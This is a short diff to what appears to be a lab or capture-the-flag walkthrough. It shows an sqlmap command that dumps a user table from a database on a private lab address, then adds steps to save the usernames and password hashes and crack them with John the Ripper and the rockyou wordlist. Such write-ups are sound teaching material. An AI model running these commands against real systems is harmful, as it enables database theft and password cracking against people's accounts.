@@ -31,3 +31,8 @@ Now lets the dump the table "users" from the database d7db
 sqlmap -u 'http://10.50.10.139/?nid=1' -D d7db -T user --dump
 ```
 
+You can now copy the username and passwords to a text file and run john the ripper to crack it
+```
+john users.has --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
